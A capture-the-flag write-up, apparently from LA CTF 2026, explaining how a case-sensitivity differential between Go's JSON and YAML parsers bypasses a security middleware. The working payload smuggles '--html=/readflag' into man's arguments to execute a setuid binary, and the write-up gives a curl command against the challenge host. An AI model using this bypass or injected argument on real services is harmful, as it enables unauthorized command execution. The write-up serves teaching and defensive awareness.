@@ -1,0 +1,184 @@
+---
+title: 'LA CTF 2026 - Glotq'
+description: 'Writeup for Glotq from LA CTF 2026. A Web challenge involving Go JSON vs YAML parser differentials.'
+date: 2026-02-09
+tags: ['writeup', 'web', 'go', 'parser-differential', 'json', 'yaml', 'lactf']
+authors: ['kudaliar']
+draft: false
+---
+
+**Category:** Web
+**Flag:** `lactf{PoLY9LOt_TH3_Fl49}`
+
+## Overview
+
+glotq is a Go web application that provides "jq / yq / xq as a service" — it accepts JSON, YAML, or XML payloads specifying a command and arguments, then executes the corresponding data-processing tool. A security middleware validates the command and arguments before the request reaches the handler. The goal is to execute a setuid binary `/readflag` to read the flag from `/flag.txt`.
+
+## Application Architecture
+
+The application has three layers:
+
+1. **Router** (`main.go`) — Three endpoints (`/json`, `/yaml`, `/xml`), each wrapped in `SecurityMiddleware` before reaching its handler.
+
+2. **SecurityMiddleware** (`middleware.go`) — Reads the request body, parses it according to the `Content-Type` header, validates the command/args, then passes the request to the handler. The body is restored via `io.NopCloser` so the handler can read it again.
+
+3. **Handlers** (`handlers.go`) — Each handler re-parses the body using its own format (JSONHandler uses `encoding/json`, YAMLHandler uses `gopkg.in/yaml.v3`, XMLHandler uses `encoding/xml`) and calls `executeCommand()`.
+
+### Parser Selection Mismatch
+
+This is the critical design flaw. The middleware and handler use **different criteria** to choose which parser to use:
+
+| Component  | Parser chosen by          |
+|------------|---------------------------|
+| Middleware | `Content-Type` header     |
+| Handler    | Which endpoint was called |
+
+This means sending a request to `/yaml` with `Content-Type: application/json` causes the **middleware to parse as JSON** while the **handler parses as YAML**.
+
+### Security Checks
+
+The middleware enforces:
+- Command must be in the endpoint's allowlist (`jq`/`man` for `/json`, `yq`/`man` for `/yaml`, `xq`/`man` for `/xml`)
+- For `man`: exactly 1 argument, must be `jq`, `yq`, or `xq`
+- For `jq`/`yq`/`xq`: **no argument validation at all**
+
+### Flag Access
+
+```dockerfile
+COPY flag.txt /flag.txt
+RUN chmod 400 /flag.txt && chown root:root /flag.txt
+
+RUN chown root:root /readflag && chmod 4755 /readflag
+```
+
+`/flag.txt` is only readable by root. `/readflag` is a setuid-root binary that reads and prints `/flag.txt`. The application runs as the unprivileged `glotq` user. We must **execute** `/readflag` to get the flag.
+
+## The Vulnerability: JSON vs YAML Case Sensitivity
+
+JSON is a valid subset of YAML, so a valid JSON document normally parses identically in both `encoding/json` and `yaml.v3`. However, there is one critical behavioral difference:
+
+> **Go's `encoding/json` performs case-insensitive struct field matching.
+> Go's `gopkg.in/yaml.v3` performs case-sensitive struct field matching.**
+
+This means for the struct:
+```go
+type YAMLPayload struct {
+    Command string   `yaml:"command"`
+    Args    []string `yaml:"args"`
+}
+```
+
+| JSON Key     | `encoding/json` matches `command`? | `yaml.v3` matches `command`? |
+|--------------|-------------------------------------|-------------------------------|
+| `"command"`  | Yes                                 | Yes                           |
+| `"Command"`  | Yes (case-insensitive)              | **No** (case-sensitive)       |
+| `"COMMAND"`  | Yes (case-insensitive)              | **No** (case-sensitive)       |
+
+### Proof of Concept
+
+```go
+input := `{"command":"man","args":["--html=/readflag","yq"],"Command":"yq","Args":["."]}`
+
+// encoding/json (case-insensitive, last value wins for duplicate matches):
+//   "command" → Command = "man"
+//   "args"    → Args = ["--html=/readflag", "yq"]
+//   "Command" → matches "command" field again, overwrites → Command = "yq"
+//   "Args"    → matches "args" field again, overwrites → Args = ["."]
+// Result: Command="yq", Args=["."]
+
+// yaml.v3 (case-sensitive):
+//   "command" → matches → Command = "man"
+//   "args"    → matches → Args = ["--html=/readflag", "yq"]
+//   "Command" → does NOT match "command" → ignored
+//   "Args"    → does NOT match "args" → ignored
+// Result: Command="man", Args=["--html=/readflag", "yq"]
+```
+
+This gives us two completely different parse results from the same bytes.
+
+## Exploit Chain
+
+### Step 1: Bypass the Middleware
+
+Send a `POST` to `/yaml` with `Content-Type: application/json`:
+
+```
+POST /yaml HTTP/1.1
+Content-Type: application/json
+
+{"command":"man","args":["--html=/readflag","yq"],"Command":"yq","Args":["."]}
+```
+
+The middleware switch-cases on `Content-Type`, sees `application/json`, and parses with `json.Unmarshal` into a `JSONPayload` struct (which also has lowercase tags `json:"command"` and `json:"args"`). Due to case-insensitive matching + last-wins for duplicates:
+
+- `command` = `"yq"` (overwritten by uppercase `"Command"`)
+- `args` = `["."]` (overwritten by uppercase `"Args"`)
+
+Middleware validation:
+1. Endpoint is `/yaml`, allowed commands are `{"yq": true, "man": true}` — `"yq"` passes.
+2. Command is `"yq"` (not `"man"`), so the strict man-argument check is skipped entirely.
+
+**Middleware passes the request through.**
+
+### Step 2: Handler Parses Differently
+
+The `YAMLHandler` parses the same body with `yaml.Unmarshal` into `YAMLPayload`. Due to case-sensitive matching:
+
+- `"command"` (lowercase) matches `yaml:"command"` → `Command = "man"`
+- `"args"` (lowercase) matches `yaml:"args"` → `Args = ["--html=/readflag", "yq"]`
+- `"Command"` (uppercase C) does **not** match → ignored
+- `"Args"` (uppercase A) does **not** match → ignored
+
+The handler calls:
+```go
+executeCommand("man", ["--html=/readflag", "yq"], body)
+```
+
+### Step 3: Command Execution
+
+`executeCommand` checks `allowedCommands["man"]` → `true`, then runs:
+
+```
+man --html=/readflag yq
+```
+
+The `--html=BROWSER` option tells `man` to format the man page as HTML and open it with the specified browser program. Unlike the `--pager` option (which is skipped when stdout is not a terminal), `--html` **always** invokes the specified program. So `man` executes `/readflag`, which reads `/flag.txt` and prints the flag.
+
+### Why `--html` Instead of `--pager`?
+
+The `--pager` / `-P` approach was the first thing tried, but `man` detects that stdout is not a terminal (since Go captures it via `cmd.CombinedOutput()`) and skips the pager entirely, just piping the formatted output directly. The `--html` option bypasses this restriction because it unconditionally invokes the specified browser binary to display the generated HTML file.
+
+## Final Exploit
+
+```bash
+curl -X POST 'https://glotq-nuwlg.instancer.lac.tf/yaml' \
+  -H 'Content-Type: application/json' \
+  -d '{"command":"man","args":["--html=/readflag","yq"],"Command":"yq","Args":["."]}'
+```
+
+Response:
+```json
+{"success":true,"output":"lactf{PoLY9LOt_TH3_Fl49}\n"}
+```
+
+## Dead Ends Explored
+
+Several other approaches were investigated before finding the case-sensitivity mismatch:
+
+| Approach | Why it failed |
+|----------|---------------|
+| **Duplicate JSON keys** (`"command"` twice) | `yaml.v3` returns an error on duplicate keys; `encoding/json` silently takes the last value. Handler errors out. |
+| **YAML merge key `<<`** | Only works with unquoted `<<` in YAML. JSON requires quoted keys, and `"<<"` is treated as a regular string key by yaml.v3, not a merge directive. |
+| **JSON `\/` escape** | YAML rejects `\/` as an unknown escape character. Causes the handler to error, not the middleware. |
+| **Type coercion** (bool/int in string fields) | JSON is stricter — errors on type mismatches. YAML is more lenient. Wrong direction (middleware errors, not handler). |
+| **UTF-8 BOM prefix** | JSON rejects BOM bytes. YAML accepts them. Wrong direction again. |
+| **`man --pager=/readflag`** | `man` skips the pager when stdout is not a terminal. Output is just the formatted man page. |
+| **Direct file read via jq/yq/xq** | `/flag.txt` is mode 400 owned by root. These tools can't read it. They also cannot execute external programs. |
+
+## Key Takeaways
+
+1. **Parser differentials are real vulnerabilities.** Even within the same language (Go), different serialization libraries (`encoding/json` vs `gopkg.in/yaml.v3`) have subtly different behaviors around case sensitivity that can be weaponized.
+
+2. **Defense-in-depth matters.** The middleware validates the request, but the handler re-parses independently. If both used the same parser instance or the middleware passed its parsed result to the handler, this vulnerability wouldn't exist.
+
+3. **JSON's case-insensitive matching is a footgun.** Go's `encoding/json` documentation notes that keys are matched case-insensitively as a convenience feature. In a security context, this leniency becomes exploitable when paired with a stricter parser.
